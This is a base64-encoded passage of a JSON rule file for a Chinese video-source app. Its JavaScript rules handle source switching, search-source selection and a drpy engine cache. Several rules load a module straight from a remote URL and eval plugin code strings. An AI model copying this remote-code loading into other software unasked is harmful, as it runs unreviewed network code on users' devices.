CAgICB9IGVsc2Uge1xcbiAgICAgICAgICBoaWRlTG9hZGluZygpO1xcbiAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5YiH5o2i5aSx6LSlXFxcIjtcXG4gICAgICAgIH1cXG4gICAgICB9LCBpdGVtKSxcXG4gICAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgICAgZXh0cmE6IHtcXG4gICAgICAgIGlkOiAncGF0aCcgKyBpLFxcbiAgICAgICAgbG9uZ0NsaWNrOiBsb25nQ1xcbiAgICAgIH1cXG4gICAgfSlcXG4gIH0pXFxufVxcblxcblxcbnNldFJlc3VsdChsYXlvdXQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5o2i5rqQ5by556qXXCIsXCJwYXRoXCI6XCJDaGFuZ2VTb3VyY2VQb3BcIixcInJ1bGVcIjpcIiQuZXhwb3J0cy5zaG93ID0gZnVuY3Rpb24gKHRpbWUpIHtcXG4gIGlmICh0aW1lKSB7XFxuICAgIGphdmEubGFuZy5UaHJlYWQuc2xlZXAodGltZSk7XFxuICB9XFxuICBjb25zdCBydW50aW1lQ29uZmlnID0gR00uZGVmaW5lTW9kdWxlKFxcXCJydW50aW1lQ29uZmlnXFxcIiwgXFxcInJ1bnRpbWVDb25maWdcXFwiKTtcXG4gIGxldCBzb3VyY2UgPSBydW50aW1lQ29uZmlnLmdldEN1cnJlbnRTb3VyY2UoKTtcXG4gIGxldCBuYW1lID0gc291cmNlID8gc291cmNlLm5hbWUgOiBcXFwiXFxcIjtcXG4gIGNvbnN0IGhpa2VyUG9wID0gJC5yZXF1aXJlKFxcXCJodHRwOi8vaGlrZXIubm9raWEucHJlc3MvaGlrZXJ1bGUvcnVsZWxpc3QuanNvbj9pZD02OTY2XFxcIik7XFxuICBsZXQgc291cmNlTmFtZUxpc3QgPSBydW50aW1lQ29uZmlnLmdldEFsbFNvdXJjZSgpLm1hcCh2ID0+IHtcXG4gICAgcmV0dXJuIHYubmFtZSA9PSBuYW1lID8gXFxcIuKAmOKAmFxcXCIgKyB2Lm5hbWUgKyBcXFwi4oCZ4oCZXFxcIiA6IHYubmFtZTtcXG4gIH0pO1xcbiAgaGlrZXJQb3Auc2V0VXNlU3RhcnRBY3Rpdml0eShmYWxzZSk7XFxuICBmdW5jdGlvbiBuYXR1cmFsU29ydChhLCBiKSB7XFxuICAgIGEgPSBhLnJlcGxhY2UoL1vigJnigJhdL2csIFxcXCJcXFwiKTtcXG4gICAgYiA9IGIucmVwbGFjZSgvW+KAmeKAmF0vZywgXFxcIlxcXCIpO1xcbiAgICByZXR1cm4gYS5sb2NhbGVDb21wYXJlKGIsIHVuZGVmaW5lZCwge1xcbiAgICAgIG51bWVyaWM6IHRydWUsXFxuICAgICAgc2Vuc2l0aXZpdHk6ICdiYXNlJ1xcbiAgICB9KTtcXG4gIH1cXG5cXG4gIGxldCBzcGVuID0gMztcXG4gIGxldCBpdGVtcyA9IHNvdXJjZU5hbWVMaXN0Lm1hcCgoeCwgaSkgPT4ge1xcbiAgICByZXR1cm4ge1xcbiAgICAgIHRpdGxlOiB4LFxcbiAgICAgIHVybDogaVxcbiAgICB9XFxuICB9KVxcblxcbiAgbGV0IG5hbWVzID0gaXRlbXMubWFwKHYgPT4gdi50aXRsZSk7XFxuICBsZXQgc25hbWUgPSBuYW1lcy5zbGljZSgpO1xcbiAgaWYgKGdldEl0ZW0oXFxcIm5hdHVyYWxcXFwiLCBcXFwiXFxcIikpIHtcXG4gICAgbmFtZXMgPSBuYW1lcy5zb3J0KG5hdHVyYWxTb3J0KTtcXG4gIH1cXG4gIGxldCBtYW5hZ2VfYWxsID0gbmFtZXMuc2xpY2UoKTtcXG4gIGxldCBzZWFyY2hLZXkgPSBcXFwiXFxcIjtcXG4gIGhpa2VyUG9wLnNlbGVjdEJvdHRvbVJlcyh7XFxuICAgIG9wdGlvbnM6IG5hbWVzLFxcbiAgICBjb2x1bW5zOiBzcGVuLFxcbiAgICB0aXRsZTogXFxcIumAieaLqeinhumikea6kFxcXCIgKyBcXFwi5b2T5YmN5YWxOlxcXCIgKyBpdGVtcy5sZW5ndGggKyBcXFwi5Liq6KeG6aKR5rqQXFxcIixcXG4gICAgLy9ub0F1dG9EaXNtaXNzOiB0cnVlLFxcbiAgICBwb3NpdGlvbjogMSxcXG4gICAgZXh0cmFJbnB1dEJveDogbmV3IGhpa2VyUG9wLlJlc0V4dHJhSW5wdXRCb3goe1xcbiAgICAgIGhpbnQ6IFxcXCLmupDlhbPplK7lrZdcXFwiLFxcbiAgICAgIHRpdGxlOiBcXFwib2tcXFwiLFxcbiAgICAgIG9uQ2hhbmdlKHRleHQsIG1hbmFnZSkge1xcbiAgICAgICAgLy9sb2coXFxcIm9uQ2hhbmdlOlxcXCIrdGV4dClcXG4gICAgICAgIGxldCBmbGlzdCA9IG5hbWVzLmZpbHRlcih4ID0+IHguaW5jbHVkZXModGV4dCkpO1xcbiAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXG4gICAgICAgIGZsaXN0LmZvckVhY2goeCA9PiB7XFxuICAgICAgICAgIG1hbmFnZS5saXN0LnB1c2goeCk7XFxuICAgICAgICB9KTtcXG4gICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXG4gICAgICB9LFxcbiAgICAgIGRlZmF1bHRWYWx1ZTogXFxcIlxcXCIsXFxuICAgICAgY2xpY2socywgbWFuYWdlKSB7XFxuICAgICAgICAvL3RvYXN0KHMpO1xcbiAgICAgICAgLy9sb2cobWFuYWdlLmxpc3QpO1xcbiAgICAgIH0sXFxuICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZVxcbiAgICB9KSxcXG4gICAgY2xpY2socywgaSwgbWFuYWdlKSB7XFxuICAgICAgc2V0SXRlbShcXFwibm9fbG9hZGluZ1xcXCIsIFxcXCIxXFxcIik7XFxuICAgICAgLy8gbWFuYWdlLmxpc3QuZm9yRWFjaCgodiwgaWkpID0+IChcXG4gICAgICAvLyAgIG1hbmFnZS5saXN0W2lpXSA9IGkgPT09IGlpID8gXFxcIuKAmOKAmFxcXCIgKyBuYW1lc1tpaV0gKyBcXFwi4oCZ4oCZXFxcIiA6IG5hbWVzW2lpXS5yZXBsYWNlKC9b4oCZ4oCYXS9nLCBcXFwiXFxcIilcXG4gICAgICAvLyApKTtcXG4gICAgICBsZXQgbmFtZSA9IG1hbmFnZS5saXN0W2ldLnJlcGxhY2UoL1vigJnigJhdL2csIFxcXCJcXFwiKTtcXG4gICAgICBpZiAobmFtZSA9PSBzb3VyY2UubmFtZSkge1xcbiAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgIHJldHVybjtcXG4gICAgICB9XFxuICAgICAgbGV0IHNvdXJjZXMgPSBydW50aW1lQ29uZmlnLmdldEFsbFNvdXJjZSgpO1xcbiAgICAgIGxldCBrZXkgPSBzb3VyY2VzLmZpbmQodiA9PiB2Lm5hbWUgPT0gbmFtZSkua2V5O1xcblxcbiAgICAgIC8vbWFuYWdlLmNoYW5nZSgpO1xcbiAgICAgIGxldCBzb3VyY2VOYW1lTGlzdCA9IHJ1bnRpbWVDb25maWcuc2V0Q3VycmVudFNvdXJjZShrZXkpO1xcbiAgICAgIGNsZWFyTXlWYXIoXFxcImNhdGVpXFxcIik7XFxuICAgICAgY2xlYXJNeVZhcihcXFwiY2F0ZV9vYmpcXFwiKTtcXG4gICAgICBjbGVhck15VmFyKFxcXCJpc2hvbWVcXFwiKTtcXG4gICAgICBjbGVhck15VmFyKFxcXCJsaW5rc1xcXCIpO1xcbiAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgIH0sXFxuICAgIG1lbnVDbGljayhtYW5hZ2UpIHtcXG4gICAgICBoaWtlclBvcC5zZWxlY3RDZW50ZXIoe1xcbiAgICAgICAgb3B0aW9uczogW1xcXCLmlLnlj5jmoLflvI9cXFwiLCBcXFwi562b6YCJ5rqQXFxcIiwgXFxcIuiHqueEtuaOkuW6jzpcXFwiICsgKGdldEl0ZW0oXFxcIm5hdHVyYWxcXFwiLCBcXFwiXFxcIikgPT0gXFxcIlxcXCIgPyBcXFwi5YWz6ZetXFxcIiA6IFxcXCLlkK/nlKhcXFwiKSwgXFxcIuWAkuW6j1xcXCIsIFxcXCLliLfmlrDphY3nva5cXFwiXSxcXG4gICAgICAgIGNvbHVtbnM6IDIsXFxuICAgICAgICB0aXRsZTogXFxcIuivt+mAieaLqVxcXCIsXFxuICAgICAgICBjbGljayhzLCBpKSB7XFxuICAgICAgICAgIGlmIChpID09PSAwKSB7XFxuICAgICAgICAgICAgc3BlbiA9IHNwZW4gPT0gMyA/IDEgOiAzO1xcbiAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2VDb2x1bW5zKHNwZW4pO1xcbiAgICAgICAgICB9IGVsc2UgaWYgKGkgPT09IDEpIHtcXG4gICAgICAgICAgICBoaWtlclBvcC5pbnB1dENvbmZpcm0oe1xcbiAgICAgICAgICAgICAgY29udGVudDogXFxcIui+k+WFpeWFs+mUruWtlyDnqbrmmL7npLrlhajpg6hcXFwiLFxcbiAgICAgICAgICAgICAgdGl0bGU6IFxcXCLnrZvpgInmupBcXFwiLFxcbiAgICAgICAgICAgICAgaGludDogXFxcIua6kOWFs+mUruWtl1xcXCIsXFxuICAgICAgICAgICAgICBkZWZhdWx0VmFsdWU6IHNlYXJjaEtleSxcXG4gICAgICAgICAgICAgIHRleHRhcmVhOiBmYWxzZSwgLy/lpJrooYzmqKHlvI9cXG4gICAgICAgICAgICAgIG1heFRleHRhcmVhOiB0cnVlLFxcbiAgICAgICAgICAgICAgbm9BdXRvU29mdDogZmFsc2UsXFxuICAgICAgICAgICAgICAvL2hpZGVDYW5jZWw6IHRydWUsXFxuICAgICAgICAgICAgICBjb25maXJtKHRleHQpIHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bnRpbWVDb25maWcgPSBHTS5kZWZpbmVNb2R1bGUoXFxcInJ1bnRpbWVDb25maWdcXFwiLCBcXFwicnVudGltZUNvbmZpZ1xcXCIpO1xcbiAgICAgICAgICAgICAgICBzZWFyY2hLZXkgPSB0ZXh0O1xcbiAgICAgICAgICAgICAgICBsZXQgbGlzdCA9IHJ1bnRpbWVDb25maWcuZ2V0QWxsU291cmNlKCkubWFwKHggPT4geC5uYW1lKTtcXG4gICAgICAgICAgICAgICAgbGV0IGZsaXN0ID0gbGlzdC5maWx0ZXIoeCA9PiB4LmluY2x1ZGVzKHRleHQpKTtcXG4gICAgICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXG4gICAgICAgICAgICAgICAgZmxpc3QuZm9yRWFjaCh4ID0+IHtcXG4gICAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHgpO1xcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcbiAgICAgICAgICAgICAgICAvL3JldHVybiBcXFwidG9hc3Q6Ly/ovpPlhaXkuoZcXFwiICsgdGV4dDtcXG4gICAgICAgICAgICAgIH0sXFxuXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgIH0gZWxzZSBpZiAoaSA9PT0gMikge1xcbiAgICAgICAgICAgIGxldCBsaXN0ID0gT2JqZWN0LmFzc2lnbihbXSwgbWFuYWdlLmxpc3QpO1xcbiAgICAgICAgICAgIGxldCBuYXR1cmFsID0gZ2V0SXRlbShcXFwibmF0dXJhbFxcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICBpZiAobmF0dXJhbCA9PSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXG4gICAgICAgICAgICAgIGxpc3Quc29ydChuYXR1cmFsU29ydCkuZm9yRWFjaCh4ID0+IHtcXG4gICAgICAgICAgICAgICAgbWFuYWdlLmxpc3QucHVzaCh4KTtcXG4gICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5sZW5ndGggPSAwO1xcbiAgICAgICAgICAgICAgc25hbWUuZm9yRWFjaCh4ID0+IHtcXG4gICAgICAgICAgICAgICAgbWFuYWdlLmxpc3QucHVzaCh4KTtcXG4gICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXG4gICAgICAgICAgICBzZXRJdGVtKFxcXCJuYXR1cmFsXFxcIiwgbmF0dXJhbCA/IFxcXCJcXFwiIDogXFxcIjFcXFwiKTtcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09IDMpIHtcXG4gICAgICAgICAgICBtYW5hZ2UubGlzdC5yZXZlcnNlKCk7XFxuICAgICAgICAgICAgbmFtZXMucmV2ZXJzZSgpO1xcbiAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXG4gICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBmdW5jdGlvbiBhcnJheURpZmZlcmVuY2UoYXJyMSwgYXJyMikge1xcbiAgICAgICAgICAgICAgY29uc3QgbWFwID0gbmV3IE1hcChhcnIyLm1hcChpdGVtID0+IFtpdGVtLmtleSwgaXRlbV0pKTtcXG4gICAgICAgICAgICAgIHJldHVybiBhcnIxLmZpbHRlcihpdGVtID0+ICFtYXAuaGFzKGl0ZW0ua2V5KSk7XFxuICAgICAgICAgICAgfVxcblxcbiAgICAgICAgICAgIGxldCBydW50aW1lQ29uZmlnID0gR00uZGVmaW5lTW9kdWxlKFxcXCJydW50aW1lQ29uZmlnXFxcIiwgXFxcInJ1bnRpbWVDb25maWdcXFwiKTtcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IHJ1bnRpbWVDb25maWcuZ2V0QWxsU291cmNlKCk7XFxuICAgICAgICAgICAgbGV0IENrZXkgPSBydW50aW1lQ29uZmlnLmdldEN1cnJlbnRTb3VyY2UoKS5rZXk7XFxuICAgICAgICAgICAgLy9sb2coQ2tleSlcXG4gICAgICAgICAgICBsZXQgY2ZnID0gcnVudGltZUNvbmZpZy5nZXRDdXJyZW50Q29uZmlnKClcXG4gICAgICAgICAgICBsZXQge1xcbiAgICAgICAgICAgICAgcGF0aCxcXG4gICAgICAgICAgICAgIG5hbWVcXG4gICAgICAgICAgICB9ID0gY2ZnO1xcbiAgICAgICAgICAgIHJ1bnRpbWVDb25maWcuc2V0Q3VycmVudENvbmZpZyh7XFxuICAgICAgICAgICAgICBwYXRoLFxcbiAgICAgICAgICAgICAgbmFtZSxcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBydW50aW1lQ29uZmlnLnNldEN1cnJlbnRTb3VyY2UoQ2tleSk7XFxuICAgICAgICAgICAgbGV0IG5zb3VyY2VzID0gcnVudGltZUNvbmZpZy5nZXRBbGxTb3VyY2UoKTtcXG5cXG4gICAgICAgICAgICBsZXQgYWxpc3QgPSBhcnJheURpZmZlcmVuY2UobnNvdXJjZXMsIGxpc3QpO1xcbiAgICAgICAgICAgIGxldCBkbGlzdCA9IGFycmF5RGlmZmVyZW5jZShsaXN0LCBuc291cmNlcyk7XFxuXFxuICAgICAgICAgICAgaWYgKGFsaXN0Lmxlbmd0aCA+IDAgfHwgZGxpc3QubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgbGV0IG1zZyA9IFxcXCJcXFwiO1xcbiAgICAgICAgICAgICAgaWYgKGFsaXN0Lmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICAgICAgYWxpc3QuZm9yRWFjaCh4ID0+IHtcXG4gICAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHgubmFtZSk7XFxuICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgIGxvZyhcXFwi5paw5aKeOlxcXCIgKyBhbGlzdC5tYXAoayA9PiBrLm5hbWUpLmpvaW4oXFxcIixcXFwiKSlcXG4gICAgICAgICAgICAgICAgbXNnICs9IFxcXCLmlrDlop5cXFwiICsgYWxpc3QubGVuZ3RoICsgXFxcIuS4qua6kFxcXCI7XFxuICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICBpZiAoZGxpc3QubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICBkbGlzdC5mb3JFYWNoKHggPT4ge1xcbiAgICAgICAgICAgICAgICAgIG1hbmFnZS5saXN0LnNwbGljZShtYW5hZ2UubGlzdC5pbmRleE9mKHgubmFtZSksIDEpO1xcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICBsb2coXFxcIuenu+mZpDpcXFwiICsgZGxpc3QubWFwKGsgPT4gay5uYW1lKS5qb2luKFxcXCIsXFxcIikpXFxuICAgICAgICAgICAgICAgIG1zZyArPSBcXFwiIOenu+mZpFxcXCIgKyBkbGlzdC5sZW5ndGggKyBcXFwi5Liq5rqQXFxcIjtcXG4gICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXG4gICAgICAgICAgICAgIHRvYXN0KG1zZyArIFxcXCIg5pu05aSa6K+m5oOF55yLbG9nXFxcIik7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgIHRvYXN0KFxcXCLlt7LliLfmlrBcXFwiKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgIH1cXG4gICAgICAgIH0sXFxuICAgICAgfSk7XFxuICAgIH1cXG4gIH0pO1xcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcImRycHnnrqHnkIZcIixcInBhdGhcIjpcIkRycHlNYW5hZ2VcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IEpTRW5naW5lID0gY29tLmV4YW1wbGUuaGlrZXJ2aWV3LnNlcnZpY2UucGFyc2VyLkpTRW5naW5lO1xcbmNvbnN0IHJ1bnRpbWVDb25maWcgPSBHTS5kZWZpbmVNb2R1bGUoXFxcInJ1bnRpbWVDb25maWdcXFwiKTtcXG5jb25zdCBkcnB5TWFwID0gbmV3IE1hcCgpO1xcbmNvbnN0IEdNa2V5ID0gbW9kdWxlLmltcG9ydFBhcmFtO1xcbmxvZyhcXFwi5Yid5aeL5YyWRHJweU1hbmFnZVxcXCIpO1xcblxcbmZ1bmN0aW9uIGJ1aWxkSnNFbnYodGlja2V0KSB7XFxuICAgIGxldCBjb2RlID0gU3RyaW5nLnJhdyBgXFxuICAgIC8vIGNvbnN0IG15X3J1bGUgPSAnXFxuICAgIGNvbnN0IE1ZX1JVTEUgPSAke215X3J1bGV9O1xcbiAgICBjb25zdCBteV9ydWxlID0gSlNPTi5zdHJpbmdpZnkoTVlfUlVMRSk7XFxuICAgIGNvbnN0IE1ZX1RJQ0tFVCA9IFxcXCIke3RpY2tldHx8XFxcIlxcXCJ9XFxcIjtcXG4gICAgZXZhbChnZXRKc1BsdWdpbigpKTtcXG4gICAgZXZhbChnZXRKc0xhenlQbHVnaW4oKSk7XFxuICAgIGA7XFxuICAgIHJldHVybiBjb2RlO1xcbn1cXG5cXG5mdW5jdGlvbiBzeW5jKGZ1bmMsIHNwKSB7XFxuICAgIHJldHVybiBuZXcgb3JnLm1vemlsbGEuamF2YXNjcmlwdC5TeW5jaHJvbml6ZXIoZnVuYywgc3AgfHwge30pO1xcbn1cXG5cXG5mdW5jdGlvbiBjcmVhdGVEcnB5KGtleSkge1xcbiAgICBKU0VuZ2luZS5nZXRJbnN0YW5jZSgpLmV2YWxKUyhidWlsZEpzRW52KE1ZX1RJQ0tFVCkgKyBcXFwiXFxcXG4hXFxcIiArICQudG9TdHJpbmcoKGtleSwgR01rZXksIE1ZX1RJQ0tFVCkgPT4ge1xcbiAgICAgICAgbGV0IGRycHkgPSAkLnJlcXVpcmUoXFxcImRycHlcXFwiKTtcXG4gICAgICAgIEdNLmhhcyhHTWtleSwgKERycHlNYW5hZ2UpID0+IHtcXG4gICAgICAgICAgICBEcnB5TWFuYWdlLnB1dChrZXksIGRycHkpO1xcbiAgICAgICAgfSk7XFxuICAgIH0sIGtleSwgR01rZXksIE1ZX1RJQ0tFVCkgKyBcXFwiO1xcXFxuXFxcIiwgXFxcIlxcXCIsIGZhbHNlKTtcXG59XFxuXFxuZnVuY3Rpb24gZ2V0KGtleSkge1xcbiAgcmV0dXJuIHN5bmMoKCkgPT4ge1xcbiAgICAvL2xvZyhkcnB5TWFwLnNpemUpXFxuICAgIGlmIChkcnB5TWFwLmhhcyhrZXkpKSB7XFxuICAgICAgcmV0dXJuIGRycHlNYXAuZ2V0KGtleSk7XFxuICAgIH1cXG4gICAgaWYgKGRycHlNYXAuc2l6ZSA+PSA1KSB7XFxuICAgICAgbG9nKFxcXCLor7fmsYI6XFxcIiArIGtleSlcXG4gICAgICBkZWwoQXJyYXkuZnJvbShkcnB5TWFwLmtleXMoKSkuYXQoMCkpO1xcbiAgICB9XFxuICAgIGxldCBzb3VyY2UgPSBydW50aW1lQ29uZmlnLmdldEFsbFNvdXJjZXMoKS5maW5kKHYgPT4gdi5rZXkgPT09IGtleSk7XFxuICAgIGNyZWF0ZURycHkoa2V5KTtcXG4gICAgbGV0IGRycHkgPSBkcnB5TWFwLmdldChrZXkpO1xcbiAgICBkcnB5LmluaXQocnVudGltZUNvbmZpZy5nZXRBYnNvbHV0ZVBhdGgoc291cmNlLmV4dCkpO1xcbiAgICByZXR1cm4gZHJweTtcXG4gIH0sIHRoaXMpLmNhbGwoKTtcXG59XFxuLy9zb3VyY2UuZXh05b+F6aG75Li657ud5a+56Lev5b6EXFxuZnVuY3Rpb24gZ2V0QnlTb3VyY2Uoc291cmNlKXtcXG4gICAgcmV0dXJuIHN5bmMoKCkgPT4ge1xcbiAgICAgICAgbGV0IGtleT1zb3VyY2Uua2V5O1xcbiAgICAgICAgLy9sb2coZHJweU1hcC5zaXplKVxcbiAgICAgICAgaWYgKGRycHlNYXAuaGFzKGtleSkpIHtcXG4gICAgICAgICAgICByZXR1cm4gZHJweU1hcC5nZXQoa2V5KTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChkcnB5TWFwLnNpemUgPj0gNSkge1xcbiAgICAgICAgICAgIGxvZyhcXFwi6K+35rGCOlxcXCIgKyBrZXkpXFxuICAgICAgICAgICAgZGVsKEFycmF5LmZyb20oZHJweU1hcC5rZXlzKCkpLmF0KDApKTtcXG4gICAgICAgIH1cXG4gICAgICAgIGNyZWF0ZURycHkoa2V5KTtcXG4gICAgICAgIGxldCBkcnB5ID0gZHJweU1hcC5nZXQoa2V5KTtcXG4gICAgICAgIGRycHkuaW5pdChzb3VyY2UuZXh0KTtcXG4gICAgICAgIHJldHVybiBkcnB5O1xcbiAgICB9LCB0aGlzKS5jYWxsKCk7XFxufVxcbmZ1bmN0aW9uIHB1dChrZXksIGRycHkpIHtcXG4gICAgc3luYygoKSA9PiBkcnB5TWFwLnNldChrZXksIGRycHkpLCB0aGlzKS5jYWxsKCk7XFxufVxcblxcbmZ1bmN0aW9uIGRlbChrZXkpIHtcXG4gICAgc3luYygoKSA9PiB7XFxuICAgICAgICBsb2coXFxcIuWIoOmZpFxcXCIgKyBrZXkpO1xcbiAgICAgICAgaWYgKGRycHlNYXAuaGFzKGtleSkpIHtcXG4gICAgICAgICAgICBkcnB5TWFwLmRlbGV0ZShrZXkpO1xcbiAgICAgICAgfVxcbiAgICB9LCB0aGlzKS5jYWxsKCk7XFxufVxcbmxldCBpc0luaXRIb21lID0gZmFsc2U7XFxuLy9sZXQgaXNJbml0U2VhcmNoID0gZmFsc2U7XFxubGV0IGlzSW5pdEVyUGFnZSA9IGZhbHNlO1xcblxcbmZ1bmN0aW9uIGluaXRQYWdlKHR5cGUpIHtcXG4gICAgc3dpdGNoICh0eXBlKSB7XFxuICAgICAgICBjYXNlIFxcXCJob21lXFxcIjpcXG4gICAgICAgICAgICBpc0luaXRIb21lID0gdHJ1ZTtcXG4gICAgICAgICAgICAvL2Nhc2UgXFxcInNlYXJjaFxcXCI6XFxuICAgICAgICAgICAgLy8gICAgaXNJbml0U2VhcmNoID0gdHJ1ZTtcXG4gICAgICAgIGNhc2UgXFxcImVyXFxcIjpcXG4gICAgICAgICAgICBpc0luaXRlclBhZ2UgPSB0cnVlO1xcbiAgICB9XFxuICAgIGFkZExpc3RlbmVyKFxcXCJvbkNsb3NlXFxcIiwgJC50b1N0cmluZygoR01rZXksIHR5cGUpID0+IHtcXG4gICAgICAgIGxvZyhcXFwib25DbG9zZVxcXCIpO1xcbiAgICAgICAgR00uaGFzKEdNa2V5LCBEcnB5TWFuYWdlID0+IHtcXG4gICAgICAgICAgICBsb2coXFxcIuaciUdNa2V5XFxcIik7XFxuICAgICAgICAgICAgRHJweU1hbmFnZS5jbGVhcih0eXBlKTtcXG4gICAgICAgIH0pO1xcbiAgICB9LCBHTWtleSwgdHlwZSkpO1xcbn1cXG5cXG5mdW5jdGlvbiBjbGVhcih0eXBlKSB7XFxuICAgIHN3aXRjaCAodHlwZSkge1xcbiAgICAgICAgY2FzZSBcXFwiaG9tZVxcXCI6XFxuICAgICAgICAgICAgaXNJbml0SG9tZSA9IGZhbHNlO1xcbiAgICAgICAgLy9jYXNlIFxcXCJzZWFyY2hcXFwiOlxcbiAgICAgICAgLy8gICAgaXNJbml0U2VhcmNoID0gZmFsc2U7XFxuICAgICAgICBjYXNlIFxcXCJlclxcXCI6XFxuICAgICAgICAgICAgaXNJbml0ZXJQYWdlID0gZmFsc2U7XFxuICAgIH1cXG5cXG4gICAgaWYgKCFpc0luaXRIb21lICYmICFpc0luaXRFclBhZ2UpIHtcXG4gICAgICAgIGxvZyhcXFwi5byA5aeL5riF55CGXFxcIik7XFxuICAgICAgICBkcnB5TWFwLmNsZWFyKCk7XFxuICAgICAgICBHTS5jbGVhcihHTWtleSk7XFxuICAgIH1cXG59XFxuJC5leHBvcnRzID0ge1xcbiAgICBpbml0UGFnZSxcXG4gICAgZ2V0LFxcbiAgICBnZXRCeVNvdXJjZSxcXG4gICAgZGVsLFxcbiAgICBjbGVhcixcXG4gICAgcHV0XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5oyH5a6a5pCc57Si5by556qXXCIsXCJwYXRoXCI6XCJTZWFyY2hBbGxvd1BvcFwiLFwicnVsZVwiOlwianM6XFxuJC5leHBvcnRzLnNob3cgPSBmdW5jdGlvbiAoKSB7XFxuICBjb25zdCBydW50aW1lQ29uZmlnID0gR00uZGVmaW5lTW9kdWxlKFxcXCJydW50aW1lQ29uZmlnXFxcIiwgXFxcInJ1bnRpbWVDb25maWdcXFwiKTtcXG4gIGNvbnN0IGhpa2VyUG9wID0gJC5yZXF1aXJlKFxcXCJodHRwOi8vaGlrZXIubm9raWEucHJlc3MvaGlrZXJ1bGUvcnVsZWxpc3QuanNvbj9pZD02OTY2XFxcIik7XFxuICBsZXQgc2VhcmNoQWxsb3cgPSBydW50aW1lQ29uZmlnLmdldFNlYXJjaEFsbG93KCk7XFxuXFxuICBsZXQgY2FuU2VhcmNoU291cmNlID0gcnVudGltZUNvbmZpZy5nZXRDYW5TZWFyY2hTb3VyY2UoKTtcXG4gIC8vbGV0IHNvdXJjZU5hbWVMaXN0ID0gY2FuU2VhcmNoU291cmNlLm1hcCh2PT52Lm5hbWUpO1xcbiAgbGV0IGdldE5hbWVzID0gKCkgPT4gZHluYW1pY1NvdXJjZS5tYXAodiA9PiBzZWFyY2hBbGxvdy5pbmNsdWRlcyh2LmtleSkgPyBcXFwi4oCc4oCc4oCd4oCdXFxcIiArICh2Lm5hbWUgKyBcXFwiXFxcIikuZm9udGNvbG9yKFxcXCIjMDA5OTY2XFxcIikgOiB2Lm5hbWUpO1xcbiAgbGV0IHNwZW4gPSAzO1xcblxcbiAgLy9sZXQgZHluYW1pY05hbWVzID0gc291cmNlTmFtZUxpc3Quc2xpY2UoKTtcXG4gIGxldCBkeW5hbWljU291cmNlID0gY2FuU2VhcmNoU291cmNlLnNsaWNlKCk7XFxuICBsZXQgc2VhcmNob25jb3VudCA9IGR5bmFtaWNTb3VyY2UuZmlsdGVyKHYgPT4gc2VhcmNoQWxsb3cuaW5jbHVkZXModi5rZXkpKS5sZW5ndGg7XFxuICBpZiAoc2VhcmNob25jb3VudCA9PSAwKSB7XFxuICAgIHNlYXJjaG9uY291bnQgPSBjYW5TZWFyY2hTb3VyY2UubGVuZ3RoO1xcbiAgfVxcblxcbiAgbGV0IHNlYXJjaEtleSA9IFxcXCJcXFwiO1xcbiAgaGlrZXJQb3Auc2VsZWN0Qm90dG9tUmVzKHtcXG4gICAgb3B0aW9uczogZ2V0TmFtZXMoKSxcXG4gICAgY29sdW1uczogc3BlbixcXG4gICAgdGl0bGU6IFxcXCLlkK/nlKjmkJzntKLmupA6XFxcIiArIHNlYXJjaG9uY291bnQgKyBcXFwi5LiqIOWFsTpcXFwiICsgY2FuU2VhcmNoU291cmNlLmxlbmd0aCArIFxcXCLkuKrmkJzntKLmupBcXFwiLFxcbiAgICBub0F1dG9EaXNtaXNzOiB0cnVlLFxcbiAgICBwb3NpdGlvbjogMSxcXG4gICAgaGVpZ2h0OiAuOSxcXG4gICAgZXh0cmFJbnB1dEJveDogbmV3IGhpa2VyUG9wLlJlc0V4dHJhSW5wdXRCb3goe1xcbiAgICAgIGhpbnQ6IFxcXCLmupDlhbPplK7lrZcg5aSa5Liq55SofOmalOW8gFxcXCIsXFxuICAgICAgdGl0bGU6IFxcXCJva1xcXCIsXFxuICAgICAgb25DaGFuZ2UodGV4dCwgb